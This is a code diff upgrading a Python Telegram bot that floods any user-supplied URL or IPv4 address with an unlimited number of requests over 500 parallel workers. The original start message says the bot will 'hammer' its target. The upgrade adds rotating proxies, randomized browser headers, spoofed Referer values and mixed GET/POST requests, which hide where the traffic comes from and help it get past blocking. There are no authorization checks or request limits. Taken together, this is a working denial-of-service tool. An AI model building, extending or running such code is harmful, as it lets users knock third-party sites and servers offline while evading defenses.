@@ -1,25 +1,30 @@
 """
-Telegram HTTP Request Bot
---------------------------
-- User sends a URL or IPv4 address
-- Bot asks: how many requests? (no limit)
-- Bot shows inline button: [▶ Start Sending]
-- After start: shows [📊 Stats] button to check live progress
-- Stats shows: sent, remaining, success/error counts, target URL
-- /cancel resets the conversation at any step
-- MongoDB stores all sessions (one doc per user)
-- Webhook mode on Render with self-ping every 10 min to avoid cold starts
-- High-concurrency browser-style refresh engine (500 workers, smart retries)
+Telegram HTTP Request Bot  — v2 (Upgraded)
+-------------------------------------------
+Improvements over v1:
+  ✅ Proxy / IP rotation  — round-robin across a user-supplied proxy list
+                            (http://, https://, socks4://, socks5://)
+  ✅ Smart SSL handling   — auto mode tries verified SSL first, falls back
+                            gracefully on SSL errors (no hard ssl=False)
+  ✅ POST support         — GET / POST / mixed modes, configurable body
+  ✅ Per-request method   — mixed mode randomly alternates GET ↔ POST
+  ✅ Richer stats         — proxy count, SSL mode, method shown in UI
+  ✅ /setproxies command  — paste proxies at runtime without redeploying
+  ✅ /setmethod command   — switch GET / POST / mixed without redeploying
+  ✅ All v1 features kept — 500 workers, user-agent rotation, MongoDB,
+                            webhook mode, self-ping, /cancel, etc.
 """
 
 import asyncio
 import logging
 import os
 import random
+import ssl
 import urllib.request
 import urllib.error
 import re
 from datetime import datetime, timezone
+from urllib.parse import urlparse
 
 import aiohttp
 from aiohttp import TCPConnector
@@ -43,7 +48,7 @@ from telegram.ext import (
 load_dotenv()
 
 # ---------------------------------------------------------------------------
-# Config — missing required vars produce a clear error at startup
+# Config
 # ---------------------------------------------------------------------------
 def _require(key: str) -> str:
     val = os.environ.get(key, "")
@@ -55,13 +60,43 @@ def _require(key: str) -> str:
     return val
 
 
-BOT_TOKEN    = _require("BOT_TOKEN")
-MONGO_URI    = _require("MONGO_URI")
-DB_NAME      = os.environ.get("MONGO_DB_NAME", "reqbot")
-WEBHOOK_URL  = os.environ.get("WEBHOOK_URL", "")
-PORT         = int(os.environ.get("PORT", "8080"))
+BOT_TOKEN   = _require("BOT_TOKEN")
+MONGO_URI   = _require("MONGO_URI")
+DB_NAME     = os.environ.get("MONGO_DB_NAME", "reqbot")
+WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
+PORT        = int(os.environ.get("PORT", "8080"))
 
-# No request limit enforced
+# ── Proxy list ───────────────────────────────────────────────────────────────
+def _parse_proxy_list(raw: str) -> list[str]:
+    """Split comma/newline separated proxy strings, strip blanks."""
+    proxies = []
+    for part in re.split(r"[,\n]+", raw):
+        p = part.strip()
+        if p:
+            if not re.match(r"^(https?|socks[45])://", p, re.I):
+                p = "http://" + p   # default scheme
+            proxies.append(p)
+    return proxies
+
+_PROXY_LIST: list[str] = _parse_proxy_list(os.environ.get("PROXY_LIST", ""))
+_proxy_index = 0   # simple round-robin counter
+
+def _next_proxy() -> str | None:
+    """Return the next proxy in round-robin order, or None if list is empty."""
+    global _proxy_index
+    if not _PROXY_LIST:
+        return None
+    proxy = _PROXY_LIST[_proxy_index % len(_PROXY_LIST)]
+    _proxy_index += 1
+    return proxy
+
+# ── SSL mode ─────────────────────────────────────────────────────────────────
+SSL_MODE = os.environ.get("SSL_MODE", "auto").lower()  # auto | true | false
+
+# ── Request method ───────────────────────────────────────────────────────────
+REQUEST_METHOD    = os.environ.get("REQUEST_METHOD", "get").lower()   # get | post | mixed
+POST_BODY         = os.environ.get("POST_BODY", "")
+POST_CONTENT_TYPE = os.environ.get("POST_CONTENT_TYPE", "application/x-www-form-urlencoded")
 
 # ---------------------------------------------------------------------------
 # Logging
@@ -77,7 +112,7 @@ logger = logging.getLogger("reqbot")
 # ---------------------------------------------------------------------------
 try:
     mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=8000)
-    mongo_client.server_info()          # fail fast if URI is wrong
+    mongo_client.server_info()
     db           = mongo_client[DB_NAME]
     sessions_col = db["sessions"]
     logger.info("MongoDB connected — database: %s", DB_NAME)
@@ -115,13 +150,14 @@ def normalize_url(text: str) -> str:
     return text
 
 # ---------------------------------------------------------------------------
-# Conversation states (stored in context.user_data)
+# Conversation states
 # ---------------------------------------------------------------------------
 STATE_IDLE       = "idle"
 STATE_WAIT_COUNT = "wait_count"
+STATE_SET_PROXY  = "set_proxy"
 
 # ---------------------------------------------------------------------------
-# MongoDB session helpers
+# MongoDB helpers
 # ---------------------------------------------------------------------------
 
 def upsert_session(user_id: int, data: dict):
@@ -148,7 +184,7 @@ def update_session(user_id: int, data: dict):
 
 def start_keyboard(user_id: int) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup([[
-        InlineKeyboardButton("▶ Start Refreshing", callback_data=f"start:{user_id}"),
+        InlineKeyboardButton("▶ Start Sending", callback_data=f"start:{user_id}"),
     ]])
 
 
@@ -157,27 +193,29 @@ def stats_keyboard(user_id: int) -> InlineKeyboardMarkup:
         InlineKeyboardButton("📊 Refresh Stats", callback_data=f"stats:{user_id}"),
     ]])
 
-
-def done_keyboard(user_id: int) -> InlineKeyboardMarkup:
-    return InlineKeyboardMarkup([[
-        InlineKeyboardButton("📊 Final Stats", callback_data=f"stats:{user_id}"),
-    ]])
-
 # ---------------------------------------------------------------------------
 # /start command
 # ---------------------------------------------------------------------------
 
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["state"] = STATE_IDLE
+    proxy_info = f"🔀 *Proxies loaded:* {len(_PROXY_LIST)}" if _PROXY_LIST else "⚠️ *No proxies — direct connection*"
+    method_icon = {"get": "📥 GET", "post": "📤 POST", "mixed": "🔀 Mixed GET+POST"}.get(REQUEST_METHOD, REQUEST_METHOD.upper())
+
     await update.message.reply_text(
-        "👋 *Browser Refresh Bot*\n\n"
-        "Send me a *URL* or *IPv4 address* and I'll hammer it with 500 parallel browser-style refreshes.\n\n"
+        "👋 *HTTP Request Bot v2*\n\n"
+        "Send me a *URL* or *IPv4 address* to fire high-concurrency requests.\n\n"
+        f"{proxy_info}\n"
+        f"🛠️ *Method:* {method_icon}\n"
+        f"🔒 *SSL mode:* `{SSL_MODE}`\n\n"
+        "📌 *Commands:*\n"
+        "/setproxies — update proxy list at runtime\n"
+        "/setmethod — switch GET / POST / mixed\n"
+        "/cancel — reset current session\n\n"
         "📌 *Steps:*\n"
-        "1️⃣ Send a URL or IPv4 address\n"
-        "2️⃣ Enter refresh count _(any amount)_\n"
-        "3️⃣ Tap *▶ Start Refreshing*\n"
-        "4️⃣ Tap *📊 Refresh Stats* any time\n\n"
-        "Use /cancel to reset at any point.",
+        "1️⃣ Send a URL or IPv4\n"
+        "2️⃣ Enter request count\n"
+        "3️⃣ Tap ▶ Start Sending",
         parse_mode="Markdown",
     )
 
@@ -194,17 +232,47 @@ async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     session = get_session(uid)
     if session and session.get("status") == "running":
         update_session(uid, {"status": "cancelled"})
-        await update.message.reply_text(
-            "🛑 Running session *cancelled*.\n\nSend a new URL to start over.",
-            parse_mode="Markdown",
-        )
+        await update.message.reply_text("🛑 Running session *cancelled*.\n\nSend a new URL to start over.", parse_mode="Markdown")
     elif state != STATE_IDLE:
+        await update.message.reply_text("↩️ Conversation reset.\n\nSend a URL or IPv4 to begin.")
+    else:
+        await update.message.reply_text("Nothing to cancel. Send a URL or IPv4 to get started.")
+
+# ---------------------------------------------------------------------------
+# /setproxies command  — paste new proxies without redeploying
+# ---------------------------------------------------------------------------
+
+async def setproxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["state"] = STATE_SET_PROXY
+    await update.message.reply_text(
+        "📋 *Set Proxy List*\n\n"
+        "Paste your proxies — one per line or comma-separated.\n"
+        "Supported: `http://`, `https://`, `socks4://`, `socks5://`\n\n"
+        "Example:\n"
+        "`http://user:pass@1.2.3.4:8080`\n"
+        "`socks5://user:pass@5.6.7.8:1080`\n\n"
+        "Send `clear` to disable all proxies.",
+        parse_mode="Markdown",
+    )
+
+# ---------------------------------------------------------------------------
+# /setmethod command
+# ---------------------------------------------------------------------------
+
+async def setmethod_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global REQUEST_METHOD
+    args = (context.args or [])
+    if args and args[0].lower() in ("get", "post", "mixed"):
+        REQUEST_METHOD = args[0].lower()
+        icons = {"get": "📥 GET", "post": "📤 POST", "mixed": "🔀 Mixed"}
         await update.message.reply_text(
-            "↩️ Conversation reset.\n\nSend a URL or IPv4 address to begin.",
+            f"✅ Method set to *{icons[REQUEST_METHOD]}*",
+            parse_mode="Markdown",
         )
     else:
         await update.message.reply_text(
-            "Nothing to cancel. Send a URL or IPv4 address to get started."
+            "Usage: `/setmethod get` | `/setmethod post` | `/setmethod mixed`",
+            parse_mode="Markdown",
         )
 
 # ---------------------------------------------------------------------------
@@ -212,9 +280,33 @@ async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ---------------------------------------------------------------------------
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global _PROXY_LIST, _proxy_index
     text  = (update.message.text or "").strip()
     state = context.user_data.get("state", STATE_IDLE)
     uid   = update.effective_user.id
+
+    # ── Proxy input ──────────────────────────────────────────────────────────
+    if state == STATE_SET_PROXY:
+        context.user_data["state"] = STATE_IDLE
+        if text.lower() == "clear":
+            _PROXY_LIST = []
+            _proxy_index = 0
+            await update.message.reply_text("✅ Proxy list cleared. Using direct connection.")
+        else:
+            new_proxies = _parse_proxy_list(text)
+            if not new_proxies:
+                await update.message.reply_text("❌ No valid proxies found. Try again or send `clear`.", parse_mode="Markdown")
+                context.user_data["state"] = STATE_SET_PROXY
+                return
+            _PROXY_LIST = new_proxies
+            _proxy_index = 0
+            await update.message.reply_text(
+                f"✅ *{len(_PROXY_LIST)} proxies loaded!*\n\n"
+                + "\n".join(f"• `{p}`" for p in _PROXY_LIST[:5])
+                + (f"\n_…and {len(_PROXY_LIST)-5} more_" if len(_PROXY_LIST) > 5 else ""),
+                parse_mode="Markdown",
+            )
+        return
 
     # ── Step 1: receive target URL / IP ─────────────────────────────────────
     if state == STATE_IDLE:
@@ -239,8 +331,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["state"]      = STATE_WAIT_COUNT
 
         await update.message.reply_text(
-            f"✅ Target set: `{url}`\n\n"
-            "How many browser refreshes? _(enter any number ≥ 1)_",
+            f"✅ Target set: `{url}`\n\nHow many requests? _(enter any number ≥ 1)_",
             parse_mode="Markdown",
         )
         return
@@ -248,14 +339,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # ── Step 2: receive request count ───────────────────────────────────────
     if state == STATE_WAIT_COUNT:
         if not text.isdigit() or int(text) < 1:
-            await update.message.reply_text(
-                "⚠️ Please enter a whole number of 1 or more."
-            )
+            await update.message.reply_text("⚠️ Please enter a whole number of 1 or more.")
             return
 
         count = int(text)
-
-        url = context.user_data.get("target_url", "")
+        url   = context.user_data.get("target_url", "")
         update_session(uid, {
             "total_requests": count,
             "sent_requests":  0,
@@ -266,20 +354,24 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["total_requests"] = count
         context.user_data["state"]          = STATE_IDLE
 
+        method_label = {"get": "GET", "post": "POST", "mixed": "GET+POST"}.get(REQUEST_METHOD, REQUEST_METHOD.upper())
+        proxy_label  = f"{len(_PROXY_LIST)} proxies (rotating)" if _PROXY_LIST else "direct (no proxy)"
+        ssl_label    = SSL_MODE
+
         await update.message.reply_text(
             f"🎯 *Ready to fire!*\n\n"
             f"🌐 *Target:* `{url}`\n"
-            f"🔄 *Refreshes:* {count} _(500 parallel workers, browser headers)_\n\n"
-            f"Press *▶ Start Refreshing* to begin.",
+            f"🔄 *Requests:* {count}\n"
+            f"📡 *Method:* {method_label}\n"
+            f"🔀 *Proxy:* {proxy_label}\n"
+            f"🔒 *SSL:* {ssl_label}\n\n"
+            f"Press *▶ Start Sending* to begin.",
             parse_mode="Markdown",
             reply_markup=start_keyboard(uid),
         )
         return
 
-    # Fallback
-    await update.message.reply_text(
-        "📌 Send me a URL or IPv4 address to get started, or use /start."
-    )
+    await update.message.reply_text("📌 Send me a URL or IPv4 to get started, or use /start.")
 
 # ---------------------------------------------------------------------------
 # Callback handler (inline buttons)
@@ -290,19 +382,13 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data  = query.data or ""
     await query.answer()
 
-    # ── ▶ Start Sending ─────────────────────────────────────────────────────
+    # ── ▶ Start Sending ──────────────────────────────────────────────────────
     if data.startswith("start:"):
         uid     = update.effective_user.id
         session = get_session(uid)
 
         if not session or session.get("status") not in ("ready",):
-            await query.edit_message_text(
-                "⚠️ No ready session found. Please send a URL first."
-            )
-            return
-
-        if session.get("status") == "running":
-            await query.answer("Already running!", show_alert=True)
+            await query.edit_message_text("⚠️ No ready session found. Please send a URL first.")
             return
 
         update_session(uid, {
@@ -314,11 +400,14 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         url   = session["target_url"]
         total = session["total_requests"]
+        method_label = {"get": "GET", "post": "POST", "mixed": "GET+POST"}.get(REQUEST_METHOD, REQUEST_METHOD.upper())
+        proxy_label  = f"{len(_PROXY_LIST)} proxies rotating" if _PROXY_LIST else "direct connection"
 
         await query.edit_message_text(
-            f"🚀 *Refreshing!*\n\n"
+            f"🚀 *Sending!*\n\n"
             f"🌐 Target: `{url}`\n"
-            f"🔄 Firing *{total}* browser-style refreshes with 500 parallel workers…\n\n"
+            f"🔄 Requests: *{total}* with 500 parallel workers\n"
+            f"📡 Method: {method_label}   🔀 {proxy_label}\n\n"
             f"Tap *📊 Refresh Stats* to check progress.",
             parse_mode="Markdown",
             reply_markup=stats_keyboard(uid),
@@ -353,14 +442,13 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         errors    = session.get("error_count", 0)
 
         status_icon = {
-            "ready":      "🟡 Ready",
-            "running":    "🟢 Running",
-            "done":       "✅ Done",
-            "cancelled":  "🛑 Cancelled",
-            "configuring":"⚙️ Configuring",
+            "ready":       "🟡 Ready",
+            "running":     "🟢 Running",
+            "done":        "✅ Done",
+            "cancelled":   "🛑 Cancelled",
+            "configuring": "⚙️ Configuring",
         }.get(status, f"❓ {status}")
 
-        # Build progress bar (10 blocks)
         if total > 0:
             filled = round((sent / total) * 10)
             bar    = "█" * filled + "░" * (10 - filled)
@@ -369,117 +457,168 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             progress_line = ""
 
+        proxy_line  = f"🔀 Proxies: {len(_PROXY_LIST)} rotating\n" if _PROXY_LIST else "🔀 Proxy: direct\n"
+        method_label = {"get": "GET", "post": "POST", "mixed": "GET+POST"}.get(REQUEST_METHOD, REQUEST_METHOD.upper())
+
         msg = (
             f"📊 *Session Stats*\n\n"
             f"🌐 *Target:* `{url}`\n"
-            f"🔄 *Refreshed:* {sent} / {total}\n"
+            f"🔄 *Sent:* {sent} / {total}\n"
             f"⏳ *Remaining:* {remaining}\n"
             f"✅ *Successful:* {success}   ❌ *Failed:* {errors}\n"
+            f"📡 *Method:* {method_label}   🔒 SSL: `{SSL_MODE}`\n"
+            f"{proxy_line}"
             f"📶 *Status:* {status_icon}"
             f"{progress_line}"
         )
 
         keyboard = stats_keyboard(uid) if status == "running" else None
-
         try:
-            await query.edit_message_text(
-                msg,
-                parse_mode="Markdown",
-                reply_markup=keyboard,
-            )
+            await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=keyboard)
         except Exception:
-            # Message unchanged — Telegram rejects identical edits
             pass
         return
 
 # ---------------------------------------------------------------------------
-# Browser User-Agent pool — rotated per request to avoid blocks
+# Browser User-Agent pool
 # ---------------------------------------------------------------------------
 _USER_AGENTS = [
-    # Chrome on Windows
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-    # Chrome on macOS
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-    # Firefox on Windows
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
-    # Firefox on Linux
     "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
-    # Edge on Windows
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
-    # Safari on macOS
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
-    # Chrome on Android
     "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
 ]
 
+
 def _browser_headers(url: str) -> dict:
-    """Return realistic browser headers that mimic a page refresh (Ctrl+F5)."""
-    ua = random.choice(_USER_AGENTS)
-    from urllib.parse import urlparse
+    ua     = random.choice(_USER_AGENTS)
     parsed = urlparse(url)
     origin = f"{parsed.scheme}://{parsed.netloc}"
     return {
         "User-Agent":                ua,
         "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language":           "en-US,en;q=0.9",
+        "Accept-Language":           random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"]),
         "Accept-Encoding":           "gzip, deflate, br",
-        "Cache-Control":             "no-cache",          # hard refresh
-        "Pragma":                    "no-cache",          # hard refresh
+        "Cache-Control":             "no-cache",
+        "Pragma":                    "no-cache",
         "Upgrade-Insecure-Requests": "1",
-        "Referer":                   origin,
+        "Referer":                   random.choice([origin, "https://www.google.com/", "https://t.co/"]),
         "Origin":                    origin,
         "Connection":                "keep-alive",
         "DNT":                       "1",
     }
 
 # ---------------------------------------------------------------------------
-# Background task: high-concurrency browser-style refresh engine
+# SSL context helpers
 # ---------------------------------------------------------------------------
 
-# Tuning knobs
-_CONCURRENCY   = 500   # parallel workers
-_MAX_RETRIES   = 5     # retry attempts per request before giving up
-_RETRY_DELAYS  = [0.05, 0.1, 0.25, 0.5, 1.0]  # back-off per retry
-_CONNECT_TIMEOUT = 8   # seconds
-_READ_TIMEOUT    = 20  # seconds
-_DB_FLUSH_EVERY  = 25  # flush counters to MongoDB every N completions
+def _ssl_for_attempt(attempt: int) -> bool | ssl.SSLContext:
+    """
+    auto mode:  attempt 0 = verified SSL, attempt ≥ 1 = skip verification
+    true mode:  always verify
+    false mode: always skip
+    """
+    if SSL_MODE == "true":
+        return True          # aiohttp default verified context
+    if SSL_MODE == "false":
+        return False
+    # auto
+    if attempt == 0:
+        return True          # first try: verified
+    return False             # fallback: skip verification
+
+# ---------------------------------------------------------------------------
+# Core request function  — GET or POST, with proxy + SSL logic
+# ---------------------------------------------------------------------------
+
+_CONCURRENCY   = 500
+_MAX_RETRIES   = 5
+_RETRY_DELAYS  = [0.05, 0.1, 0.25, 0.5, 1.0]
+_CONNECT_TIMEOUT = 8
+_READ_TIMEOUT    = 20
+_DB_FLUSH_EVERY  = 25
 
 
-async def _do_single_refresh(
+def _pick_method() -> str:
+    """Return 'get' or 'post' based on REQUEST_METHOD setting."""
+    if REQUEST_METHOD == "mixed":
+        return random.choice(["get", "post"])
+    return REQUEST_METHOD   # 'get' or 'post'
+
+
+async def _do_single_request(
     session: aiohttp.ClientSession,
     url: str,
     sem: asyncio.Semaphore,
 ) -> bool:
-    """Perform one browser-style GET with retries. Returns True on success."""
+    """
+    Perform one request (GET or POST) with:
+      - proxy rotation (round-robin)
+      - auto SSL fallback
+      - configurable retries
+    Returns True on any HTTP response (server reached), False on network failure.
+    """
     async with sem:
         for attempt in range(_MAX_RETRIES):
+            proxy   = _next_proxy()          # None = direct
+            ssl_ctx = _ssl_for_attempt(attempt)
+            method  = _pick_method()
+
+            # Build kwargs
+            kwargs: dict = {
+                "headers":        _browser_headers(url),
+                "ssl":            ssl_ctx,
+                "allow_redirects": True,
+            }
+            if proxy:
+                kwargs["proxy"] = proxy
+
+            # POST body
+            if method == "post" and POST_BODY:
+                kwargs["data"]    = POST_BODY
+                kwargs["headers"]["Content-Type"] = POST_CONTENT_TYPE
+
             try:
-                headers = _browser_headers(url)
-                async with session.get(
-                    url,
-                    headers=headers,
-                    ssl=False,
-                    allow_redirects=True,
-                ) as resp:
-                    # Read body so the server sees a complete page load
+                req_fn = session.get if method == "get" else session.post
+                async with req_fn(url, **kwargs) as resp:
                     await resp.read()
-                    # Any HTTP response counts as a successful "refresh"
-                    # (the page was served — even 4xx means the server responded)
-                    return True
-            except (aiohttp.ServerDisconnectedError,
-                    aiohttp.ClientConnectorError,
-                    asyncio.TimeoutError) as exc:
-                if attempt < _MAX_RETRIES - 1:
-                    await asyncio.sleep(_RETRY_DELAYS[attempt])
-                else:
-                    logger.debug("Req failed after %d retries: %s", _MAX_RETRIES, exc)
-                    return False
-            except Exception as exc:
-                logger.debug("Req unexpected error: %s", exc)
+                    return True   # any HTTP status = server responded
+
+            except aiohttp.ClientSSLError:
+                # SSL error on verified attempt → immediately retry without verification
+                if SSL_MODE == "auto" and attempt == 0:
+                    continue
+                logger.debug("SSL error, giving up: %s", url)
                 return False
+
+            except (
+                aiohttp.ServerDisconnectedError,
+                aiohttp.ClientConnectorError,
+                asyncio.TimeoutError,
+                aiohttp.ClientProxyConnectionError,
+                aiohttp.ClientHttpProxyError,
+            ) as exc:
+                if attempt < _MAX_RETRIES - 1:
+                    await asyncio.sleep(_RETRY_DELAYS[min(attempt, len(_RETRY_DELAYS)-1)])
+                else:
+                    logger.debug("Request failed after %d retries: %s", _MAX_RETRIES, exc)
+                    return False
+
+            except Exception as exc:
+                logger.debug("Unexpected error: %s", exc)
+                return False
+
     return False
 
+# ---------------------------------------------------------------------------
+# Background task
+# ---------------------------------------------------------------------------
 
 async def send_requests_task(
     bot,
@@ -488,32 +627,24 @@ async def send_requests_task(
     url: str,
     total: int,
 ):
-    """High-concurrency browser-style refresh engine.
-
-    • 500 parallel workers
-    • Browser headers + User-Agent rotation (looks like real page refreshes)
-    • Up to 5 retries per request with exponential back-off
-    • Any HTTP response = success (server was reached and responded)
-    • Only true network failures (timeout, refused) count as errors
-    • Respects 'cancelled' status from /cancel
-    """
     sent    = 0
     success = 0
     errors  = 0
 
     sem = asyncio.Semaphore(_CONCURRENCY)
 
+    # SOCKS proxy support requires aiohttp-socks; create a standard connector
+    # (proxy kwarg per-request handles routing for http/socks proxies)
     connector = TCPConnector(
-        limit=_CONCURRENCY + 50,   # max open connections
+        limit=_CONCURRENCY + 50,
         limit_per_host=_CONCURRENCY,
         ttl_dns_cache=300,
         enable_cleanup_closed=True,
-        ssl=False,
     )
     timeout = aiohttp.ClientTimeout(
         connect=_CONNECT_TIMEOUT,
         sock_read=_READ_TIMEOUT,
-        total=None,  # let individual retries manage total time
+        total=None,
     )
 
     async with aiohttp.ClientSession(
@@ -526,8 +657,8 @@ async def send_requests_task(
         idx = 0
 
         while idx < total or pending:
-            # Check for cancellation
-            if not (idx % 50):   # check every 50 launches
+            # Cancellation check
+            if not (idx % 50):
                 db_session = get_session(uid)
                 if db_session and db_session.get("status") == "cancelled":
                     logger.info("Task uid=%d cancelled at idx=%d", uid, idx)
@@ -535,21 +666,16 @@ async def send_requests_task(
                         t.cancel()
                     return
 
-            # Fill up to concurrency
+            # Fill up to concurrency limit
             while idx < total and len(pending) < _CONCURRENCY:
-                task = asyncio.create_task(
-                    _do_single_refresh(http, url, sem)
-                )
+                task = asyncio.create_task(_do_single_request(http, url, sem))
                 pending.add(task)
                 idx += 1
 
             if not pending:
                 break
 
-            # Wait for the first batch to finish
-            done, pending = await asyncio.wait(
-                pending, return_when=asyncio.FIRST_COMPLETED
-            )
+            done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
 
             for t in done:
                 ok = t.result()
@@ -559,7 +685,6 @@ async def send_requests_task(
                 else:
                     errors += 1
 
-            # Flush to MongoDB periodically
             if sent % _DB_FLUSH_EVERY == 0 or sent == total:
                 update_session(uid, {
                     "sent_requests": sent,
@@ -574,11 +699,16 @@ async def send_requests_task(
         "error_count":   errors,
     })
 
+    success_rate = round((success / sent * 100) if sent else 0)
+    method_label = {"get": "GET", "post": "POST", "mixed": "GET+POST"}.get(REQUEST_METHOD, REQUEST_METHOD.upper())
+
     summary = (
         f"✅ *All done!*\n\n"
         f"🌐 Target: `{url}`\n"
-        f"🔄 Refreshes: *{sent}* / {total}\n"
-        f"✅ Successful: *{success}*   ❌ Failed: *{errors}*\n\n"
+        f"🔄 Requests: *{sent}* / {total}\n"
+        f"📡 Method: {method_label}\n"
+        f"✅ Successful: *{success}*   ❌ Failed: *{errors}*\n"
+        f"📈 Success rate: *{success_rate}%*\n\n"
         f"Send another URL to start a new session."
     )
 
@@ -588,7 +718,7 @@ async def send_requests_task(
         logger.error("Could not notify user %d on completion: %s", uid, exc)
 
 # ---------------------------------------------------------------------------
-# Self-ping (keeps Render free tier alive, fires every 10 min)
+# Self-ping
 # ---------------------------------------------------------------------------
 
 _self_ping_url: str | None = None
@@ -618,14 +748,12 @@ async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE):
 # ---------------------------------------------------------------------------
 
 def build_app():
-    app = (
-        ApplicationBuilder()
-        .token(BOT_TOKEN)
-        .build()
-    )
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
 
-    app.add_handler(CommandHandler("start",  start_cmd))
-    app.add_handler(CommandHandler("cancel", cancel_cmd))
+    app.add_handler(CommandHandler("start",      start_cmd))
+    app.add_handler(CommandHandler("cancel",     cancel_cmd))
+    app.add_handler(CommandHandler("setproxies", setproxies_cmd))
+    app.add_handler(CommandHandler("setmethod",  setmethod_cmd))
     app.add_handler(CallbackQueryHandler(handle_callback))
     app.add_handler(
         MessageHandler(
@@ -634,7 +762,6 @@ def build_app():
         )
     )
     app.add_error_handler(on_error)
-
     return app
 
 # ---------------------------------------------------------------------------
@@ -652,21 +779,18 @@ def main():
 
     if on_render and not webhook_target:
         raise RuntimeError(
-            "Running on Render but neither WEBHOOK_URL nor RENDER_EXTERNAL_URL is set.\n"
-            "Add WEBHOOK_URL in your Render dashboard."
+            "Running on Render but neither WEBHOOK_URL nor RENDER_EXTERNAL_URL is set."
         )
 
     if webhook_target:
-        webhook_base = webhook_target.rstrip("/")
+        webhook_base     = webhook_target.rstrip("/")
         if not webhook_base.startswith(("http://", "https://")):
             webhook_base = f"https://{webhook_base}"
-
         full_webhook_url = f"{webhook_base}/{BOT_TOKEN}"
 
         logger.info("Webhook mode — port %s", PORT)
         logger.info("Webhook URL: %s", full_webhook_url)
 
-        # Self-ping every 10 min (first ping after 60 s)
         _self_ping_url = webhook_base
         app.job_queue.run_repeating(self_ping, interval=600, first=60)
 
@@ -679,7 +803,7 @@ def main():
             drop_pending_updates=True,
         )
     else:
-        logger.info("Polling mode (local dev — no WEBHOOK_URL / RENDER_EXTERNAL_URL)")
+        logger.info("Polling mode (local dev)")
         app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 
